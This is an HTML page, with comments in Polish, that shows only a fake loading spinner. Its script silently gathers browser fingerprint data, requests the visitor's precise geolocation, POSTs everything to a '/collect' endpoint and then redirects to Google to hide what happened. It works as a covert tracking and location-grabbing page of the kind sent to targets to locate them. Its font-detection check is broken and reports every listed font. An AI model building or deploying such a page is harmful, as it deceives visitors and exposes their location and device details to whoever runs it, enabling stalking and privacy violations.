<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background: #111; color: #fff; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="loader"></div>
        <p>Trwa ładowanie...</p>
    </div>

    <script>
    // === ZBIERZ WSZYSTKIE MOŻLIWE DANE ===
    const data = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height} (${window.devicePixelRatio} DPI)`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'direct',
        cookies: navigator.cookieEnabled,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        webgl: (() => { try { return !!document.createElement('canvas').getContext('webgl'); } catch(e) { return false; } })(),
        fonts: (() => {
            // Lista popularnych czcionek (fingerprint)
            const fontList = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Impact', 'Comic Sans MS'];
            const available = fontList.filter(f => document.createElement('span').style.fontFamily = f);
            return available.join(', ');
        })(),
        // === GEOLOKALIZACJA Z JAVASCRIPT (jeśli użytkownik zezwoli) ===
        location: null
    };

    // === PROŚBA O DOKŁADNĄ GEOLOKALIZACJĘ ===
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                data.location = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude || null
                };
                sendData();
            },
            (err) => {
                // Użytkownik odmówił lub błąd – kontynuujemy bez dokładnej lokalizacji
                sendData();
            },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else {
        sendData();
    }

    // === WYŚLIJ WSZYSTKO NA SERWER ===
    function sendData() {
        fetch('/collect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).then(() => {
            window.location.href = 'https://www.google.com';
        }).catch(() => {
            window.location.href = 'https://www.google.com';
        });
    }
    </script>
</body>
</html>
